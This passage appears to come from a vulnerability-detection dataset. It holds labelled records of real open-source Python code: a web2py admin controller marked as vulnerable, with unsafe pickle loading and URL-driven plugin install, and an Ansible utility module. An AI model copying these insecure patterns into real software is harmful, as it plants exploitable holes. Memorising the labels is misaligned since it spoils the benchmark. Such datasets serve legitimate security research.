db_ready['errlink'] = \"http://web2py.com/books/default/chapter/29/13#Collecting-tickets\"\n\n    if method == 'new':\n        errors_path = apath('%s/errors' % app, r=request)\n\n        delete_hashes = []\n        for item in request.vars:\n            if item[:7] == 'delete_':\n                delete_hashes.append(item[7:])\n\n        hash2error = dict()\n\n        for fn in listdir(errors_path, '^[a-fA-F0-9.\\-]+$'):\n            fullpath = os.path.join(errors_path, fn)\n            if not os.path.isfile(fullpath):\n                continue\n            try:\n                fullpath_file = open(fullpath, 'r')\n                try:\n                    error = pickle.load(fullpath_file)\n                finally:\n                    fullpath_file.close()\n            except IOError:\n                continue\n            except EOFError:\n                continue\n\n            hash = hashlib.md5(error['traceback']).hexdigest()\n\n            if hash in delete_hashes:\n                os.unlink(fullpath)\n            else:\n                try:\n                    hash2error[hash]['count'] += 1\n                except KeyError:\n                    error_lines = error['traceback'].split(\"\\n\")\n                    last_line = error_lines[-2] if len(error_lines) > 1 else 'unknown'\n                    error_causer = os.path.split(error['layer'])[1]\n                    hash2error[hash] = dict(count=1, pickel=error,\n                                            causer=error_causer,\n                                            last_line=last_line,\n                                            hash=hash, ticket=fn)\n\n        decorated = [(x['count'], x) for x in hash2error.values()]\n        decorated.sort(key=operator.itemgetter(0), reverse=True)\n\n        return dict(errors=[x[1] for x in decorated], app=app, method=method, db_ready=db_ready)\n\n    elif method == 'dbnew':\n        errors_path = apath('%s/errors' % app, r=request)\n        tk_db, tk_table = get_ticket_storage(app)\n\n        delete_hashes = []\n        for item in request.vars:\n            if item[:7] == 'delete_':\n                delete_hashes.append(item[7:])\n\n        hash2error = dict()\n\n        for fn in tk_db(tk_table.id > 0).select():\n            try:\n                error = pickle.loads(fn.ticket_data)\n                hash = hashlib.md5(error['traceback']).hexdigest()\n\n                if hash in delete_hashes:\n                    tk_db(tk_table.id == fn.id).delete()\n                    tk_db.commit()\n                else:\n                    try:\n                        hash2error[hash]['count'] += 1\n                    except KeyError:\n                        error_lines = error['traceback'].split(\"\\n\")\n                        last_line = error_lines[-2]\n                        error_causer = os.path.split(error['layer'])[1]\n                        hash2error[hash] = dict(count=1,\n                                                pickel=error, causer=error_causer,\n                                                last_line=last_line, hash=hash,\n                                                ticket=fn.ticket_id)\n            except AttributeError, e:\n                tk_db(tk_table.id == fn.id).delete()\n                tk_db.commit()\n\n        decorated = [(x['count'], x) for x in hash2error.values()]\n        decorated.sort(key=operator.itemgetter(0), reverse=True)\n        return dict(errors=[x[1] for x in decorated], app=app,\n                    method=method, db_ready=db_ready)\n\n    elif method == 'dbold':\n        tk_db, tk_table = get_ticket_storage(app)\n        for item in request.vars:\n            if item[:7] == 'delete_':\n                tk_db(tk_table.ticket_id == item[7:]).delete()\n                tk_db.commit()\n        tickets_ = tk_db(tk_table.id > 0).select(tk_table.ticket_id,\n                                                 tk_table.created_datetime,\n                                                 orderby=~tk_table.created_datetime)\n        tickets = [row.ticket_id for row in tickets_]\n        times = dict([(row.ticket_id, row.created_datetime) for\n                      row in tickets_])\n        return dict(app=app, tickets=tickets, method=method,\n                    times=times, db_ready=db_ready)\n\n    else:\n        for item in request.vars:\n            # delete_all rows doesn't contain any ticket\n            # Remove anything else as requested\n            if item[:7] == 'delete_' and (not item == \"delete_all}\"):\n                os.unlink(apath('%s/errors/%s' % (app, item[7:]), r=request))\n        func = lambda p: os.stat(apath('%s/errors/%s' %\n                                       (app, p), r=request)).st_mtime\n        tickets = sorted(\n            listdir(apath('%s/errors/' % app, r=request), '^\\w.*'),\n            key=func,\n            reverse=True)\n\n        return dict(app=app, tickets=tickets, method=method, db_ready=db_ready)\n\n\ndef get_ticket_storage(app):\n    private_folder = apath('%s/private' % app, r=request)\n    ticket_file = os.path.join(private_folder, 'ticket_storage.txt')\n    if os.path.exists(ticket_file):\n        db_string = open(ticket_file).read()\n        db_string = db_string.strip().replace('\\r', '').replace('\\n', '')\n    elif is_gae:\n        # use Datastore as fallback if there is no ticket_file\n        db_string = \"google:datastore\"\n    else:\n        return False\n    tickets_table = 'web2py_ticket'\n    tablename = tickets_table + '_' + app\n    db_path = apath('%s/databases' % app, r=request)\n    ticketsdb = DAL(db_string, folder=db_path, auto_import=True)\n    if not ticketsdb.get(tablename):\n        table = ticketsdb.define_table(\n            tablename,\n            Field('ticket_id', length=100),\n            Field('ticket_data', 'text'),\n            Field('created_datetime', 'datetime'),\n        )\n    return ticketsdb, ticketsdb.get(tablename)\n\n\ndef make_link(path):\n    \"\"\" Create a link from a path \"\"\"\n    tryFile = path.replace('\\\\', '/')\n\n    if os.path.isabs(tryFile) and os.path.isfile(tryFile):\n        (folder, filename) = os.path.split(tryFile)\n        (base, ext) = os.path.splitext(filename)\n        app = get_app()\n\n        editable = {'controllers': '.py', 'models': '.py', 'views': '.html'}\n        for key in editable.keys():\n            check_extension = folder.endswith(\"%s/%s\" % (app, key))\n            if ext.lower() == editable[key] and check_extension:\n                return A('\"' + tryFile + '\"',\n                         _href=URL(r=request,\n                                   f='edit/%s/%s/%s' % (app, key, filename))).xml()\n    return ''\n\n\ndef make_links(traceback):\n    \"\"\" Make links using the given traceback \"\"\"\n\n    lwords = traceback.split('\"')\n\n    # Making the short circuit compatible with <= python2.4\n    result = (len(lwords) != 0) and lwords[0] or ''\n\n    i = 1\n\n    while i < len(lwords):\n        link = make_link(lwords[i])\n\n        if link == '':\n            result += '\"' + lwords[i]\n        else:\n            result += link\n\n            if i + 1 < len(lwords):\n                result += lwords[i + 1]\n                i = i + 1\n\n        i = i + 1\n\n    return result\n\n\nclass TRACEBACK(object):\n    \"\"\" Generate the traceback \"\"\"\n\n    def __init__(self, text):\n        \"\"\" TRACEBACK constructor \"\"\"\n\n        self.s = make_links(CODE(text).xml())\n\n    def xml(self):\n        \"\"\" Returns the xml \"\"\"\n\n        return self.s\n\n\ndef ticket():\n    \"\"\" Ticket handler \"\"\"\n\n    if len(request.args) != 2:\n        session.flash = T('invalid ticket')\n        redirect(URL('site'))\n\n    app = get_app()\n    myversion = request.env.web2py_version\n    ticket = request.args[1]\n    e = RestrictedError()\n    e.load(request, app, ticket)\n\n    return dict(app=app,\n                ticket=ticket,\n                output=e.output,\n                traceback=(e.traceback and TRACEBACK(e.traceback)),\n                snapshot=e.snapshot,\n                code=e.code,\n                layer=e.layer,\n                myversion=myversion)\n\n\ndef ticketdb():\n    \"\"\" Ticket handler \"\"\"\n\n    if len(request.args) != 2:\n        session.flash = T('invalid ticket')\n        redirect(URL('site'))\n\n    app = get_app()\n    myversion = request.env.web2py_version\n    ticket = request.args[1]\n    e = RestrictedError()\n    request.tickets_db = get_ticket_storage(app)[0]\n    e.load(request, app, ticket)\n    response.view = 'default/ticket.html'\n    return dict(app=app,\n                ticket=ticket,\n                output=e.output,\n                traceback=(e.traceback and TRACEBACK(e.traceback)),\n                snapshot=e.snapshot,\n                code=e.code,\n                layer=e.layer,\n                myversion=myversion)\n\n\ndef error():\n    \"\"\" Generate a ticket (for testing) \"\"\"\n    raise RuntimeError('admin ticket generator at your service')\n\n\ndef update_languages():\n    \"\"\" Update available languages \"\"\"\n\n    app = get_app()\n    update_all_languages(apath(app, r=request))\n    session.flash = T('Language files (static strings) updated')\n    redirect(URL('design', args=app, anchor='languages'))\n\n\ndef user():\n    if MULTI_USER_MODE:\n        if not db(db.auth_user).count():\n            auth.settings.registration_requires_approval = False\n        return dict(form=auth())\n    else:\n        return dict(form=T(\"Disabled\"))\n\n\ndef reload_routes():\n    \"\"\" Reload routes.py \"\"\"\n    import gluon.rewrite\n    gluon.rewrite.load()\n    redirect(URL('site'))\n\n\ndef manage_students():\n    if not (MULTI_USER_MODE and is_manager()):\n        session.flash = T('Not Authorized')\n        redirect(URL('site'))\n    db.auth_user.registration_key.writable = True\n    grid = SQLFORM.grid(db.auth_user)\n    return locals()\n\n\ndef bulk_register():\n    if not (MULTI_USER_MODE and is_manager()):\n        session.flash = T('Not Authorized')\n        redirect(URL('site'))\n    form = SQLFORM.factory(Field('emails', 'text'))\n    if form.process().accepted:\n        emails = [x.strip() for x in form.vars.emails.split('\\n') if x.strip()]\n        n = 0\n        for email in emails:\n            if not db.auth_user(email=email):\n                n += db.auth_user.insert(email=email) and 1 or 0\n        session.flash = T('%s students registered', n)\n        redirect(URL('site'))\n    return locals()\n\n# Begin experimental stuff need fixes:\n# 1) should run in its own process - cannot os.chdir\n# 2) should not prompt user at console\n# 3) should give option to force commit and not reuqire manual merge\n\n\ndef git_pull():\n    \"\"\" Git Pull handler \"\"\"\n    app = get_app()\n    if not have_git:\n        session.flash = GIT_MISSING\n        redirect(URL('site'))\n    dialog = FORM.confirm(T('Pull'),\n                          {T('Cancel'): URL('site')})\n    if dialog.accepted:\n        try:\n            repo = git.Repo(os.path.join(apath(r=request), app))\n            origin = repo.remotes.origin\n            origin.fetch()\n            origin.pull()\n            session.flash = T(\"Application updated via git pull\")\n            redirect(URL('site'))\n\n        except git.CheckoutError:\n            session.flash = T(\"Pull failed, certain files could not be checked out. Check logs for details.\")\n            redirect(URL('site'))\n        except git.UnmergedEntriesError:\n            session.flash = T(\"Pull is not possible because you have unmerged files. Fix them up in the work tree, and then try again.\")\n            redirect(URL('site'))\n        except git.GitCommandError:\n            session.flash = T(\n                \"Pull failed, git exited abnormally. See logs for details.\")\n            redirect(URL('site'))\n        except AssertionError:\n            session.flash = T(\"Pull is not possible because you have unmerged files. Fix them up in the work tree, and then try again.\")\n            redirect(URL('site'))\n    elif 'cancel' in request.vars:\n        redirect(URL('site'))\n    return dict(app=app, dialog=dialog)\n\n\ndef git_push():\n    \"\"\" Git Push handler \"\"\"\n    app = get_app()\n    if not have_git:\n        session.flash = GIT_MISSING\n        redirect(URL('site'))\n    form = SQLFORM.factory(Field('changelog', requires=IS_NOT_EMPTY()))\n    form.element('input[type=submit]')['_value'] = T('Push')\n    form.add_button(T('Cancel'), URL('site'))\n    form.process()\n    if form.accepted:\n        try:\n            repo = git.Repo(os.path.join(apath(r=request), app))\n            index = repo.index\n            index.add([apath(r=request) + app + '/*'])\n            new_commit = index.commit(form.vars.changelog)\n            origin = repo.remotes.origin\n            origin.push()\n            session.flash = T(\n                \"Git repo updated with latest application changes.\")\n            redirect(URL('site'))\n        except git.UnmergedEntriesError:\n            session.flash = T(\"Push failed, there are unmerged entries in the cache. Resolve merge issues manually and try again.\")\n            redirect(URL('site'))\n    return dict(app=app, form=form)\n\n\ndef plugins():\n    app = request.args(0)\n    from serializers import loads_json\n    if not session.plugins:\n        try:\n            rawlist = urllib.urlopen(\"http://www.web2pyslices.com/\" +\n                                     \"public/api.json/action/list/content/Package?package\" +\n                                     \"_type=plugin&search_index=false\").read()\n            session.plugins = loads_json(rawlist)\n        except:\n            response.flash = T('Unable to download the list of plugins')\n            session.plugins = []\n    return dict(plugins=session.plugins[\"results\"], app=request.args(0))\n\n\ndef install_plugin():\n    app = request.args(0)\n    source = request.vars.source\n    plugin = request.vars.plugin\n    if not (source and app):\n        raise HTTP(500, T(\"Invalid request\"))\n    # make sure no XSS attacks in source\n    if not source.lower().split('://')[0] in ('http','https'):\n        raise HTTP(500, T(\"Invalid request\"))\n    form = SQLFORM.factory()\n    result = None\n    if form.process().accepted:\n        # get w2p plugin\n        if \"web2py.plugin.\" in source:\n            filename = \"web2py.plugin.%s.w2p\" % \\\n                source.split(\"web2py.plugin.\")[-1].split(\".w2p\")[0]\n        else:\n            filename = \"web2py.plugin.%s.w2p\" % cleanpath(plugin)\n        if plugin_install(app, urllib.urlopen(source),\n                          request, filename):\n            session.flash = T('New plugin installed: %s', filename)\n        else:\n            session.flash = \\\n                T('unable to install plugin \"%s\"', filename)\n        redirect(URL(f=\"plugins\", args=[app, ]))\n    return dict(form=form, app=app, plugin=plugin, source=source)\n", "target": 1}
{"idx": 975, "func": "# (c) 2012, Michael DeHaan <michael.dehaan@gmail.com>\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\n\nimport sys\nimport re\nimport os\nimport shlex\nimport yaml\nimport copy\nimport optparse\nimport operator\nfrom ansible import errors\nfrom ansible import __version__\nfrom ansible.utils import template\nfrom ansible.utils.display_functions import *\nfrom ansible.utils.plugins import *\nfrom ansible.callbacks import display\nimport ansible.constants as C\nimport ast\nimport time\nimport StringIO\nimport stat\nimport termios\nimport tty\nimport pipes\nimport random\nimport difflib\nimport warnings\nimport traceback\nimport getpass\nimport sys\nimport json\n\n#import vault\nfrom vault import VaultLib\n\nVERBOSITY=0\n\nMAX_FILE_SIZE_FOR_DIFF=1*1024*1024\n\ntry:\n    import json\nexcept ImportError:\n    import simplejson as json\n\ntry:\n    from hashlib import md5 as _md5\nexcept ImportError:\n    from md5 import md5 as _md5\n\nPASSLIB_AVAILABLE = False\ntry:\n    import passlib.hash\n    PASSLIB_AVAILABLE = True\nexcept:\n    pass\n\nKEYCZAR_AVAILABLE=False\ntry:\n    try:\n        # some versions of pycrypto may not have this?\n        from Crypto.pct_warnings import PowmInsecureWarning\n    except ImportError:\n        PowmInsecureWarning = RuntimeWarning\n\n    with warnings.catch_warnings(record=True) as warning_handler:\n        warnings.simplefilter(\"error\", PowmInsecureWarning)\n        try:\n            import keyczar.errors as key_errors\n            from keyczar.keys import AesKey\n        except PowmInsecureWarning:\n            system_warning(\n                \"The version of gmp you have installed has a known issue regarding \" + \\\n                \"timing vulnerabilities when used with pycrypto. \" + \\\n                \"If possible, you should update it (ie. yum update gmp).\"\n            )\n            warnings.resetwarnings()\n            warnings.simplefilter(\"ignore\")\n            import keyczar.errors as key_errors\n            from keyczar.keys import AesKey\n        KEYCZAR_AVAILABLE=True\nexcept ImportError:\n    pass\n\n###############################################################\n# Abstractions around keyczar\n###############################################################\n\ndef key_for_hostname(hostname):\n    # fireball mode is an implementation of ansible firing up zeromq via SSH\n    # to use no persistent daemons or key management\n\n    if not KEYCZAR_AVAILABLE:\n        raise errors.AnsibleError(\"python-keyczar must be installed on the control machine to use accelerated modes\")\n\n    key_path = os.path.expanduser(C.ACCELERATE_KEYS_DIR)\n    if not os.path.exists(key_path):\n        os.makedirs(key_path, mode=0700)\n        os.chmod(key_path, int(C.ACCELERATE_KEYS_DIR_PERMS, 8))\n    elif not os.path.isdir(key_path):\n        raise errors.AnsibleError('ACCELERATE_KEYS_DIR is not a directory.')\n\n    if stat.S_IMODE(os.stat(key_path).st_mode) != int(C.ACCELERATE_KEYS_DIR_PERMS, 8):\n        raise errors.AnsibleError('Incorrect permissions on the private key directory. Use `chmod 0%o %s` to correct this issue, and make sure any of the keys files contained within that directory are set to 0%o' % (int(C.ACCELERATE_KEYS_DIR_PERMS, 8), C.ACCELERATE_KEYS_DIR, int(C.ACCELERATE_KEYS_FILE_PERMS, 8)))\n\n    key_path = os.path.join(key_path, hostname)\n\n    # use new AES keys every 2 hours, which means fireball must not allow running for longer either\n    if not os.path.exists(key_path) or (time.time() - os.path.getmtime(key_path) > 60*60*2):\n        key = AesKey.Generate()\n        fd = os.open(key_path, os.O_WRONLY | os.O_CREAT, int(C.ACCELERATE_KEYS_FILE_PERMS, 8))\n        fh = os.fdopen(fd, 'w')\n        fh.write(str(key))\n        fh.close()\n        return key\n    else:\n        if stat.S_IMODE(os.stat(key_path).st_mode) != int(C.ACCELERATE_KEYS_FILE_PERMS, 8):\n            raise errors.AnsibleError('Incorrect permissions on the key file for this host. Use `chmod 0%o %s` to correct this issue.' % (int(C.ACCELERATE_KEYS_FILE_PERMS, 8), key_path))\n        fh = open(key_path)\n        key = AesKey.Read(fh.read())\n        fh.close()\n        return key\n\ndef encrypt(key, msg):\n    return key.Encrypt(msg)\n\ndef decrypt(key, msg):\n    try:\n        return key.Decrypt(msg)\n    except key_errors.InvalidSignatureError:\n        raise errors.AnsibleError(\"decryption failed\")\n\n###############################################################\n# UTILITY FUNCTIONS FOR COMMAND LINE TOOLS\n###############################################################\n\ndef err(msg):\n    ''' print an error message to stderr '''\n\n    print >> sys.stderr, msg\n\ndef exit(msg, rc=1):\n    ''' quit with an error to stdout and a failure code '''\n\n    err(msg)\n    sys.exit(rc)\n\ndef jsonify(result, format=False):\n    ''' format JSON output (uncompressed or uncompressed) '''\n\n    if result is None:\n        return \"{}\"\n    result2 = result.copy()\n    for key, value in result2.items():\n        if type(value) is str:\n            result2[key] = value.decode('utf-8', 'ignore')\n    if format:\n        return json.dumps(result2, sort_keys=True, indent=4)\n    else:\n        return json.dumps(result2, sort_keys=True)\n\ndef write_tree_file(tree, hostname, buf):\n    ''' write something into treedir/hostname '''\n\n    # TODO: might be nice to append playbook runs per host in a similar way\n    # in which case, we'd want append mode.\n    path = os.path.join(tree, hostname)\n    fd = open(path, \"w+\")\n    fd.write(buf)\n    fd.close()\n\ndef is_failed(result):\n    ''' is a given JSON result a failed result? '''\n\n    return ((result.get('rc', 0) != 0) or (result.get('failed', False) in [ True, 'True', 'true']))\n\ndef is_changed(result):\n    ''' is a given JSON result a changed result? '''\n\n    return (result.get('changed', False) in [ True, 'True', 'true'])\n\ndef check_conditional(conditional, basedir, inject, fail_on_undefined=False):\n\n    if conditional is None or conditional == '':\n        return True\n\n    if isinstance(conditional, list):\n        for x in conditional:\n            if not check_conditional(x, basedir, inject, fail_on_undefined=fail_on_undefined):\n                return False\n        return True\n\n    if not isinstance(conditional, basestring):\n        return conditional\n\n    conditional = conditional.replace(\"jinja2_compare \",\"\")\n    # allow variable names\n    if conditional in inject and '-' not in str(inject[conditional]):\n        conditional = inject[conditional]\n    conditional = template.template(basedir, conditional, inject, fail_on_undefined=fail_on_undefined)\n    original = str(conditional).replace(\"jinja2_compare \",\"\")\n    # a Jinja2 evaluation that results in something Python can eval!\n    presented = \"{%% if %s %%} True {%% else %%} False {%% endif %%}\" % conditional\n    conditional = template.template(basedir, presented, inject)\n    val = conditional.strip()\n    if val == presented:\n        # the templating failed, meaning most likely a \n        # variable was undefined. If we happened to be \n        # looking for an undefined variable, return True,\n        # otherwise fail\n        if \"is undefined\" in conditional:\n            return True\n        elif \"is defined\" in conditional:\n            return False\n        else:\n            raise errors.AnsibleError(\"error while evaluating conditional: %s\" % original)\n    elif val == \"True\":\n        return True\n    elif val == \"False\":\n        return False\n    else:\n        raise errors.AnsibleError(\"unable to evaluate conditional: %s\" % original)\n\ndef is_executable(path):\n    '''is the given path executable?'''\n    return (stat.S_IXUSR & os.stat(path)[stat.ST_MODE]\n            or stat.S_IXGRP & os.stat(path)[stat.ST_MODE]\n            or stat.S_IXOTH & os.stat(path)[stat.ST_MODE])\n\ndef unfrackpath(path):\n    ''' \n    returns a path that is free of symlinks, environment\n    variables, relative path traversals and symbols (~)\n    example:\n    '$HOME/../../var/mail' becomes '/var/spool/mail'\n    '''\n    return os.path.normpath(os.path.realpath(os.path.expandvars(os.path.expanduser(path))))\n\ndef prepare_writeable_dir(tree,mode=0777):\n    ''' make sure a directory exists and is writeable '''\n\n    # modify the mode to ensure the owner at least\n    # has read/write access to this directory\n    mode |= 0700\n\n    # make sure the tree path is always expanded\n    # and normalized and free of symlinks\n    tree = unfrackpath(tree)\n\n    if not os.path.exists(tree):\n        try:\n            os.makedirs(tree, mode)\n        except (IOError, OSError), e:\n            raise errors.AnsibleError(\"Could not make dir %s: %s\" % (tree, e))\n    if not os.access(tree, os.W_OK):\n        raise errors.AnsibleError(\"Cannot write to path %s\" % tree)\n    return tree\n\ndef path_dwim(basedir, given):\n    '''\n    make relative paths work like folks expect.\n    '''\n\n    if given.startswith(\"/\"):\n        return os.path.abspath(given)\n    elif given.startswith(\"~\"):\n        return os.path.abspath(os.path.expanduser(given))\n    else:\n        if basedir is None:\n            basedir = \".\"\n        return os.path.abspath(os.path.join(basedir, given))\n\ndef path_dwim_relative(original, dirname, source, playbook_base, check=True):\n    ''' find one file in a directory one level up in a dir named dirname relative to current '''\n    # (used by roles code)\n\n    basedir = os.path.dirname(original)\n    if os.path.islink(basedir):\n        basedir = unfrackpath(basedir)\n        template2 = os.path.join(basedir, dirname, source)\n    else:\n        template2 = os.path.join(basedir, '..', dirname, source)\n    source2 = path_dwim(basedir, template2)\n    if os.path.exists(source2):\n        return source2\n    obvious_local_path = path_dwim(playbook_base, source)\n    if os.path.exists(obvious_local_path):\n        return obvious_local_path\n    if check:\n        raise errors.AnsibleError(\"input file not found at %s or %s\" % (source2, obvious_local_path))\n    return source2 # which does not exist\n\ndef json_loads(data):\n    ''' parse a JSON string and return a data structure '''\n\n    return json.loads(data)\n\ndef parse_json(raw_data):\n    ''' this version for module return data only '''\n\n    orig_data = raw_data\n\n    # ignore stuff like tcgetattr spewage or other warnings\n    data = filter_leading_non_json_lines(raw_data)\n\n    try:\n        return json.loads(data)\n    except:\n        # not JSON, but try \"Baby JSON\" which allows many of our modules to not\n        # require JSON and makes writing modules in bash much simpler\n        results = {}\n        try:\n            tokens = shlex.split(data)\n        except:\n            print \"failed to parse json: \"+ data\n            raise\n\n        for t in tokens:\n            if \"=\" not in t:\n                raise errors.AnsibleError(\"failed to parse: %s\" % orig_data)\n            (key,value) = t.split(\"=\", 1)\n            if key == 'changed' or 'failed':\n                if value.lower() in [ 'true', '1' ]:\n                    value = True\n                elif value.lower() in [ 'false', '0' ]:\n                    value = False\n            if key == 'rc':\n                value = int(value)\n            results[key] = value\n        if len(results.keys()) == 0:\n            return { \"failed\" : True, \"parsed\" : False, \"msg\" : orig_data }\n        return results\n\ndef smush_braces(data):\n    ''' smush Jinaj2 braces so unresolved templates like {{ foo }} don't get parsed weird by key=value code '''\n    while '{{ ' in data:\n        data = data.replace('{{ ', '{{')\n    while ' }}' in data:\n        data = data.replace(' }}', '}}')\n    return data\n\ndef smush_ds(data):\n    # things like key={{ foo }} are not handled by shlex.split well, so preprocess any YAML we load\n    # so we do not have to call smush elsewhere\n    if type(data) == list:\n        return [ smush_ds(x) for x in data ]\n    elif type(data) == dict:\n        for (k,v) in data.items():\n            data[k] = smush_ds(v)\n        return data\n    elif isinstance(data, basestring):\n        return smush_braces(data)\n    else:\n        return data\n\ndef parse_yaml(data, path_hint=None):\n    ''' convert a yaml string to a data structure.  Also supports JSON, ssssssh!!!'''\n\n    stripped_data = data.lstrip()\n    loaded = None\n    if stripped_data.startswith(\"{\") or stripped_data.startswith(\"[\"):\n        # since the line starts with { or [ we can infer this is a JSON document.\n        try:\n            loaded = json.loads(data)\n        except ValueError, ve:\n            if path_hint:\n                raise errors.AnsibleError(path_hint + \": \" + str(ve))\n            else:\n                raise errors.AnsibleError(str(ve))\n    else:\n        # else this is pretty sure to be a YAML document\n        loaded = yaml.safe_load(data)\n\n    return smush_ds(loaded)\n\ndef process_common_errors(msg, probline, column):\n    replaced = probline.replace(\" \",\"\")\n\n    if \":{{\" in replaced and \"}}\" in replaced:\n        msg = msg + \"\"\"\nThis one looks easy to fix.  YAML thought it was looking for the start of a \nhash/dictionary and was confused to see a second \"{\".  Most likely this was\nmeant to be an ansible template evaluation instead, so we have to give the \nparser a small hint that we wanted a string instead. The solution here is to \njust quote the entire value.\n\nFor instance, if the original line was:\n\n    app_path: {{ base_path }}/foo\n\nIt should be written as:\n\n    app_path: \"{{ base_path }}/foo\"\n\"\"\"\n        return msg\n\n    elif len(probline) and len(probline) > 1 and len(probline) > column and probline[column] == \":\" and probline.count(':') > 1:\n        msg = msg + \"\"\"\nThis one looks easy to fix.  There seems to be an extra unquoted colon in the line \nand this is confusing the parser. It was only expecting to find one free \ncolon. The solution is just add some quotes around the colon, or quote the \nentire line after the first colon.\n\nFor instance, if the original line was:\n\n    copy: src=file.txt dest=/path/filename:with_colon.txt\n\nIt can be written as:\n\n    copy: src=file.txt dest='/path/filename:with_colon.txt'\n\nOr:\n    \n    copy: 'src=file.txt dest=/path/filename:with_colon.txt'\n\n\n\"\"\"\n        return msg\n    else:\n        parts = probline.split(\":\")\n        if len(parts) > 1:\n            middle = parts[1].strip()\n            match = False\n            unbalanced = False\n            if middle.startswith(\"'\") and not middle.endswith(\"'\"):\n                match = True\n            elif middle.startswith('\"') and not middle.endswith('\"'):\n                match = True\n            if len(middle) > 0 and middle[0] in [ '\"', \"'\" ] and middle[-1] in [ '\"', \"'\" ] and probline.count(\"'\") > 2 or probline.count('\"') > 2:\n                unbalanced = True\n            if match:\n                msg = msg + \"\"\"\nThis one looks easy to fix.  It seems that there is a value started \nwith a quote, and the YAML parser is expecting to see the line ended \nwith the same kind of quote.  For instance:\n\n    when: \"ok\" in result.stdout\n\nCould be written as:\n\n   when: '\"ok\" in result.stdout'\n\nor equivalently:\n\n   when: \"'ok' in result.stdout\"\n\n\"\"\"\n                return msg\n\n            if unbalanced:\n                msg = msg + \"\"\"\nWe could be wrong, but this one looks like it might be an issue with \nunbalanced quotes.  If starting a value with a quote, make sure the \nline ends with the same set of quotes.  For instance this arbitrary \nexample:\n\n    foo: \"bad\" \"wolf\"\n\nCould be written as:\n\n    foo: '\"bad\" \"wolf\"'\n\n\"\"\"\n                return msg\n\n    return msg\n\ndef process_yaml_error(exc, data, path=None, show_content=True):\n    if hasattr(exc, 'problem_mark'):\n        mark = exc.problem_mark\n        if show_content:\n            if mark.line -1 >= 0:\n                before_probline = data.split(\"\\n\")[mark.line-1]\n            else:\n                before_probline = ''\n            probline = data.split(\"\\n\")[mark.line]\n            arrow = \" \" * mark.column + \"^\"\n            msg = \"\"\"Syntax Error while loading YAML script, %s\nNote: The error may actually appear before this position: line %s, column %s\n\n%s\n%s\n%s\"\"\" % (path, mark.line + 1, mark.column + 1, before_probline, probline, arrow)\n\n            unquoted_var = None\n            if '{{' in probline and '}}' in probline:\n                if '\"{{' not in probline or \"'{{\" not in probline:\n                    unquoted_var = True\n\n            if not unquoted_var:\n                msg = process_common_errors(msg, probline, mark.column)\n            else:\n                msg = msg + \"\"\"\nWe could be wrong, but this one looks like it might be an issue with\nmissing quotes.  Always quote template expression brackets when they \nstart a value. For instance:            \n\n    with_items:\n      - {{ foo }}\n\nShould be written as:\n\n    with_items:\n      - \"{{ foo }}\"      \n\n\"\"\"\n        else:\n            # most likely displaying a file with sensitive content,\n            # so don't show any of the actual lines of yaml just the\n            # line number itself\n            msg = \"\"\"Syntax error while loading YAML script, %s\nThe error appears to have been on line %s, column %s, but may actually\nbe before there depending on the exact syntax problem.\n\"\"\" % (path, mark.line + 1, mark.column + 1)\n\n    else:\n        # No problem markers means we have to throw a generic\n        # \"stuff messed up\" type message. Sry bud.\n        if path:\n            msg = \"Could not parse YAML. Check over %s again.\" % path\n        else:\n            msg = \"Could not parse YAML.\"\n    raise errors.AnsibleYAMLValidationFailed(msg)\n\n\ndef parse_yaml_from_file(path, vault_password=None):\n    ''' convert a yaml file to a data structure '''\n\n    data = None\n    show_content = True\n\n    try:\n        data = open(path).read()\n    except IOError:\n        raise errors.AnsibleError(\"file could not read: %s\" % path)\n\n    vault = VaultLib(password=vault_password)\n    if vault.is_encrypted(data):\n        data = vault.decrypt(data)\n        show_content = False\n\n    try:\n        return parse_yaml(data, path_hint=path)\n    except yaml.YAMLError, exc:\n        process_yaml_error(exc, data, path, show_content)\n\ndef parse_kv(args):\n    ''' convert a string of key/value items to a dict '''\n    options = {}\n    if args is not None:\n        # attempting to split a unicode here does bad things\n        args = args.encode('utf-8')\n        try:\n            vargs = shlex.split(args, posix=True)\n        except ValueError, ve:\n            if 'no closing quotation' in str(ve).lower():\n                raise errors.AnsibleError(\"error parsing argument string, try quoting the entire line.\")\n            else:\n                raise\n        vargs = [x.decode('utf-8') for x in vargs]\n        for x in vargs:\n            if \"=\" in x:\n                k, v = x.split(\"=\",1)\n                options[k]=v\n    return options\n\ndef merge_hash(a, b):\n    ''' recursively merges hash b into a\n    keys from b take precedence over keys from a '''\n\n    result = copy.deepcopy(a)\n\n    # next, iterate over b keys and values\n    for k, v in b.iteritems():\n        # if there's already such key in a\n        # and that key contains dict\n        if k in result and isinstance(result[k], dict):\n            # merge those dicts recursively\n            result[k] = merge_hash(a[k], v)\n        else:\n            # otherwise, just copy a value from b to a\n            result[k] = v\n\n    return result\n\ndef md5s(data):\n    ''' Return MD5 hex digest of data. '''\n\n    digest = _md5()\n    try:\n        digest.update(data)\n    except UnicodeEncodeError:\n        digest.update(data.encode('utf-8'))\n    return digest.hexdigest()\n\ndef md5(filename):\n    ''' Return MD5 hex digest of local file, None if file is not present or a directory. '''\n\n    if not os.path.exists(filename) or os.path.isdir(filename):\n        return None\n    digest = _md5()\n    blocksize = 64 * 1024\n    try:\n        infile = open(filename, 'rb')\n        block = infile.read(blocksize)\n        while block:\n            digest.update(block)\n            block = infile.read(blocksize)\n        infile.close()\n    except IOError, e:\n        raise errors.AnsibleError(\"error while accessing the file %s, error was: %s\" % (filename, e))\n    return digest.hexdigest()\n\ndef default(value, function):\n    ''' syntactic sugar around lazy evaluation of defaults '''\n    if value is None:\n        return function()\n    return value\n\ndef _gitinfo():\n    ''' returns a string containing git branch, commit id and commit date '''\n    result = None\n    repo_path = os.path.join(os.path.dirname(__file__), '..', '..', '..', '.git')\n\n    if os.path.exists(repo_path):\n        # Check if the .git is a file. If it is a file, it means that we are in a submodule structure.\n        if os.path.isfile(repo_path):\n            try:\n                gitdir = yaml.safe_load(open(repo_path)).get('gitdir')\n                # There is a posibility the .git file to have an absolute path.\n                if os.path.isabs(gitdir):\n                    repo_path = gitdir\n                else:\n                    repo_path = os.path.join(repo_path.split('.git')[0], gitdir)\n            except (IOError, 